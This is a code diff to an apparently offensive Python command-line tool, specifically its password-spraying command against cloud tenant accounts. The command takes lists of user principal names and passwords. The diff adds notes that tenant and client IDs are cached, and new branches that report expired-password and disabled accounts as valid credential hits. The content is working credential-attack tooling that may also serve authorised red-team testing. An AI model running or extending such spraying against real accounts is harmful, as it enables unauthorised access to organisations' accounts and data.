@@ -25,11 +25,11 @@ def _read_lines(path_str: str) -> list:
 @brute_app.command("pwspray")
 @handle_cli_errors
 def brute_pwspray(
-    tenant:      str = typer.Option(None, "-t", "--tenant", help="Tenant ID"),
+    tenant:      str = typer.Option(None, "-t", "--tenant", help="Tenant ID (will be cached upon explicit use)"),
     userlist:    str = typer.Option(..., "-u", "--upn", help="File of userPrincipalNames, one per line"),
     password:    str = typer.Option(None, "-p", "--password", help="A single password to spray (use this or --passwords)"),
     passwords:   str = typer.Option(None, "-P", "--passwords", help="File of passwords, one per line, each sprayed as its own round"),
-    client_id:   str = typer.Option(..., "-c", "--client-id", help="Client ID to authenticate with"),
+    client_id:   str = typer.Option(..., "-c", "--client-id", help="Client ID to authenticate with (will be cached upon explicit use)"),
     resource:    str = typer.Option("graph", "-r", "--resource", help="Target resource for the spray (Optional, default: graph)"),
     domain:      str = typer.Option(None, "-d", "--domain", help="Append this domain to any bare (no @) entries in the list (Optional)"),
     user_agent:  str = typer.Option(None, "-a", "--user-agent", help="Use a single custom User-Agent (Optional)"),
@@ -128,6 +128,16 @@ def brute_pwspray(
                 console.print(f"[dim][-] {upn}: wrong password[/dim]")
                 continue
 
+            if status == "gap_expired":
+                solved[upn] = (pw, "valid, password expired (must be changed)")
+                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, account requires password change")
+                continue
+
+            if status == "gap_disabled":
+                solved[upn] = (pw, "valid, account disabled")
+                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, account is disabled")
+                continue
+            
             if status == "fatal_account_missing":
                 console.print(f"[dim][-] {upn}: account does not exist[/dim]")
                 continue
